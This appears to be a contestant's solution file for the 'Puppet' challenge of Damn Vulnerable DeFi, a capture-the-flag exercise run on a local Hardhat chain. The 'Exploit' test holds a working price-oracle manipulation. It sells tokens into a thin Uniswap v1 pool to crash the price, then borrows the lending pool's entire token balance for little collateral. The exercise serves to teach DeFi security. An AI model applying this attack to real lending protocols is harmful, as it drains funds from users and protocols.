const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require("hardhat");
const { expect } = require("chai");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(
  tokensSold,
  tokensInReserve,
  etherInReserve
) {
  return tokensSold
    .mul(ethers.BigNumber.from("997"))
    .mul(etherInReserve)
    .div(
      tokensInReserve
        .mul(ethers.BigNumber.from("1000"))
        .add(tokensSold.mul(ethers.BigNumber.from("997")))
    );
}

describe("[Challenge] Puppet", function () {
  let deployer, attacker;

  // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther("10");
  const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther("10");

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("1000");
  const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther("25");
  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther("100000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const UniswapExchangeFactory = new ethers.ContractFactory(
      exchangeJson.abi,
      exchangeJson.evm.bytecode,
      deployer
    );
    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.evm.bytecode,
      deployer
    );

    const DamnValuableTokenFactory = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const PuppetPoolFactory = await ethers.getContractFactory(
      "PuppetPool",
      deployer
    );

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x15af1d78b58c40000", // 25 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ATTACKER_INITIAL_ETH_BALANCE
    );

    // Deploy token to be traded in Uniswap
    this.token = await DamnValuableTokenFactory.deploy();

    // Deploy a exchange that will be used as the factory template
    this.exchangeTemplate = await UniswapExchangeFactory.deploy();

    // Deploy factory, initializing it with the address of the template exchange
    this.uniswapFactory = await UniswapFactoryFactory.deploy();
    await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

    // Create a new exchange for the token, and retrieve the deployed exchange's address
    let tx = await this.uniswapFactory.createExchange(this.token.address, {
      gasLimit: 1e6,
    });
    const { events } = await tx.wait();
    this.uniswapExchange = await UniswapExchangeFactory.attach(
      events[0].args.exchange
    );

    // Deploy the lending pool
    this.lendingPool = await PuppetPoolFactory.deploy(
      this.token.address,
      this.uniswapExchange.address
    );

    // Add initial token and ETH liquidity to the pool
    await this.token.approve(
      this.uniswapExchange.address,
      UNISWAP_INITIAL_TOKEN_RESERVE
    );
    await this.uniswapExchange.addLiquidity(
      0, // min_liquidity
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
    );

    // Ensure Uniswap exchange is working as expected
    expect(
      await this.uniswapExchange.getTokenToEthInputPrice(
        ethers.utils.parseEther("1"),
        { gasLimit: 1e6 }
      )
    ).to.be.eq(
      calculateTokenToEthInputPrice(
        ethers.utils.parseEther("1"),
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE
      )
    );

    // Setup initial token balances of pool and attacker account
    await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    await this.token.transfer(
      this.lendingPool.address,
      POOL_INITIAL_TOKEN_BALANCE
    );

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    expect(
      await this.lendingPool.calculateDepositRequired(
        ethers.utils.parseEther("1")
      )
    ).to.be.eq(ethers.utils.parseEther("2"));

    expect(
      await this.lendingPool.calculateDepositRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul("2"));
  });

  it("Exploit", async function () {
    // /** CODE YOUR EXPLOIT HERE
    //  * I think that the right course here would be lowering the price
    //  * by interacting directly with the Uniswap contract. Particularly by
    //  * adding more tokens as liquidity, and then depositing enough wei to
    //  * be able to withraw as much as tokens as I can, hoping this would empty
    //  * the PP.
    //  *
    //  * Note: I sill don't know why I can't immediately addLiquidity.
    //  *
    //  *
    //  */

    async function deadline() {
      return (await ethers.provider.getBlock("latest")).timestamp * 2;
    }

    let parseEther = ethers.utils.parseEther;
    let formatEther = ethers.utils.formatEther;
    let getBalance = ethers.provider.getBalance;
    let lendingPool = await this.lendingPool.connect(attacker);
    let uniswapExchange = await this.uniswapExchange.connect(attacker);
    let token = await this.token.connect(attacker);

    // async function info() {
    //   msg = "";
    //   deposit = await lendingPool.calculateDepositRequired(parseEther("1"));
    //   deposit = formatEther(deposit);
    //   msg = msg.concat(`Required to deposit ${deposit}, for 1 DVT\n\n`);

    //   // ETH balances
    //   poolBal = formatEther(await getBalance(lendingPool.address));
    //   uniBal = formatEther(await getBalance(uniswapExchange.address));
    //   atkrBal = formatEther(await getBalance(attacker.address));
    //   msg = msg.concat(`ETH balances:\n`)
    //   msg = msg.concat(`\tPuppetPool: ${poolBal} | UniSwap: ${uniBal} | Attacker: ${atkrBal}\n\n`);

    //   //DVT balances
    //   poolTs = formatEther(await token.balanceOf(lendingPool.address));
    //   uniTs = formatEther(await token.balanceOf(uniswapExchange.address));
    //   atkrTs = formatEther(await token.balanceOf(attacker.address));
    //   msg = msg.concat(`DamnVulnerableTokens balances:\n`);
    //   msg = msg.concat(`\tPuppetPool: ${poolTs} | UniSwap: ${uniTs} | Attacker: ${atkrTs}\n\n`);

    //   //Other values, such as Liquidity tokens, and deposited amount on lendingpool
    //   atkrLPs = formatEther(await uniswapExchange.balanceOf(attacker.address, {gasLimit: 1e6}));
    //   atkrDepos = formatEther(await lendingPool.deposits(attacker.address));
    //   msg = msg.concat(`Attacker additional info:\n`)
    //   msg = msg.concat(`LP tokens: ${atkrLPs}. PuppetPool deposits: ${atkrDepos} \n\n`)

    //   console.log(msg);
    // }

    // Let's create shorter variables for readability.
    let initialEthBalance = ATTACKER_INITIAL_ETH_BALANCE;
    let tokensToSell = ATTACKER_INITIAL_TOKEN_BALANCE;
    let tokensToHack = POOL_INITIAL_TOKEN_BALANCE;

    async function canWeGetThemYet() {
      deposit = await lendingPool.calculateDepositRequired(tokensToHack);
      deposit = formatEther(deposit);
      console.log(`Required to deposit ${deposit} ETH, to get 100k DVTs\n\n`);
      return deposit;
    }

    await canWeGetThemYet();
    // If we want to sell all our tokens, how much ETH would we get?
    tokenPrice = await uniswapExchange.getTokenToEthInputPrice(tokensToSell, {
      gasLimit: 1e6,
    });
    console.log(
      `You get ${formatEther(tokenPrice)} ETH for ${formatEther(
        tokensToSell
      )} DVTs.`
    );

    // Ok, so let's approve UniSwap to manage our tokens
    await token.approve(uniswapExchange.address, tokensToSell);

    // Let's exchange them, and we won't conform for less
    // In a real case scenario, tokenPrice could be a little lower.
    await uniswapExchange.tokenToEthSwapInput(
      tokensToSell,
      tokenPrice,
      deadline(),
      {
        gasLimit: 1e6,
      }
    );

    await canWeGetThemYet();
    deposit = await lendingPool.calculateDepositRequired(tokensToHack);

    // Let's get all the tokens from the pool
    await lendingPool.borrow(tokensToHack, { value: deposit });

    // Since it is expected that we get more than the pool's initial token balance.
    // We have to swap our ether for some of the tokens we already deposited.
    currentEth = await getBalance(attacker.address);
    tokensToBuy = await uniswapExchange.getEthToTokenInputPrice(
      currentEth, {
      gasLimit: 1e6,
    });

    // Now I want the cost in ETH if I were to buy 1k tokens.
    etherNeeded = await uniswapExchange.getEthToTokenOutputPrice(
      parseEther("1000"), {
      gasLimit: 1e6,
    });

    console.log(`Your current balance is ${formatEther(currentEth)} ETH.`);
    console.log(`With that, you can afford to buy ${formatEther(tokensToBuy)} DVTs.`);
    console.log(`You will need ${formatEther(etherNeeded)} ETH to buy 1000 DVTs.`);

    // I want my 1k tokens back.
    await uniswapExchange.ethToTokenSwapInput(parseEther("1000"), deadline(), {
      value: etherNeeded,
      gasLimit: 1e6,
    });

    currentTokens = await token.balanceOf(attacker.address);
    currentEth = await getBalance(attacker.address);
    console.log(`Your current balance is ${formatEther(currentEth)} ETH and ${formatEther(currentTokens)}.`);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq("0");
    expect(await this.token.balanceOf(attacker.address)).to.be.gt(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
